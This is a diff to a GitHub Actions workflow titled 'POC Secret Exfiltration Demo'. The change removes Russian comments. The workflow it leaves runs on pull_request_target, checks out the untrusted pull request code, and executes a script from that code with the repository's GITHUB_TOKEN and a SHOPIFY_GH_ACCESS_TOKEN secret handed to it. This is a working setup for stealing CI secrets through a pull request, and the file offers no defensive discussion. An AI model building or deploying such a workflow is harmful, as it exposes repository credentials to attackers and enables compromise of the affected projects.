@@ -1,7 +1,7 @@
 name: POC Secret Exfiltration Demo
 on:
-  pull_request_target: # Оставляем для основной цели
-  workflow_dispatch:   # Добавляем ручной запуск
+  pull_request_target:
+  workflow_dispatch:
 
 permissions:
   contents: read
@@ -14,9 +14,6 @@ jobs:
       - name: Checkout PR code or current branch
         uses: actions/checkout@v4
         with:
-          # Для workflow_dispatch, github.event.pull_request.head.sha будет пустым.
-          # В этом случае мы просто берем текущий SHA ветки, для которой workflow запускается вручную.
-          # Для pull_request_target, он корректно возьмет SHA из PR.
           ref: ${{ github.event.pull_request.head.sha || github.sha }}
 
       - name: Display Context Info (for debugging)
@@ -28,7 +25,7 @@ jobs:
           echo "SHA for checkout: ${{ github.event.pull_request.head.sha || github.sha }}"
 
       - name: Execute PoC Script from PR/Branch
-        run: ./.github/workflows/dependabot_auto_merge_changeset.sh # Наш измененный скрипт
+        run: ./.github/workflows/dependabot_auto_merge_changeset.sh
         env:
           DEMO_GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           DEMO_SHOPIFY_GH_ACCESS_TOKEN: ${{ secrets.SHOPIFY_GH_ACCESS_TOKEN }}
